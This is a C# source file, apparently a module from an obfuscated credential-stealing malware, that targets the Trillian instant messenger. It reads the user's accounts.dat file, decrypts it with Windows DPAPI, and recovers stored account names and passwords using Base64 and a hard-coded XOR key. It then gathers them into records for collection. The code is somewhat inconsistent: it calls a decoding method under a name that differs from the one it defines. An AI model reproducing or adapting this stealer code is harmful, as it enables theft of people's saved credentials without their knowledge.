using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Trillian : EtbH
	{
		public Trillian()
		{
			this.sKVqz = "Trillian";
		}

		public string sKVqz { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			string path = Path.Combine(
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				"Trillian\\users\\global\\accounts.dat"
			);

			if (!File.Exists(path))
				return list;

			try
			{
				byte[] decryptedData = GHbU7Rc.ZDzD1h(
					File.ReadAllBytes(path),
					DataProtectionScope.CurrentUser
				);

				w3uoxlrf accountData = new w3uoxlrf();
				accountData.ULlXEXipk(decryptedData);

				foreach (string key in accountData.Keys)
				{
					try
					{
						if (!key.StartsWith("Account") || key == "Accounts")
							continue;

						list.Add(new WTitxI2m
						{
							data1 = "trillian.im",
							data2 = accountData[key]["Account"],
							data3 = Trillian.qb3yUNUi979(accountData[key]["Password"]),
							data4 = "Trillian"
						});
					}
					catch
					{
					}
				}
			}
			catch
			{
			}

			return list;
		}

		private static string DecodeTrillianPassword(string encoded)
		{
			try
			{
				string decodedString =
					Encoding.Default.GetString(Convert.FromBase64String(encoded));

				byte[] data = g3Vt7T2gk5._83xr(decodedString);

				byte[] xorKey = new byte[]
				{
					243, 38, 129, 196, 57, 134, 219, 146,
					113, 163, 185, 230, 83, 122, 149, 124,
					0, 0, 0, 0, 0, 0, 255, 0,
					0, 128, 0, 0, 0, 128, 128, 0,
					255, 0, 0, 0, 128, 0, 128, 0,
					128, 128, 0, 0, 0, 128, 255, 0,
					128, 0, 255, 0, 128, 128, 128, 0,
					85, 110, 97, 98, 108, 101, 32, 116,
					111, 32, 114, 101, 115, 111, 108, 118,
					101, 32, 72, 84, 84, 80, 32, 112,
					114, 111, 120, 0
				};

				StringBuilder result = new StringBuilder();
				int keyIndex = 0;

				for (int i = 0; i < data.Length - 1; i++)
				{
					result.Append((char)(data[i] ^ xorKey[keyIndex]));

					keyIndex++;
					if (keyIndex > i + 1)
						keyIndex = 0;
				}

				return result.ToString();
			}
			catch
			{
				return "";
			}
		}
	}
}
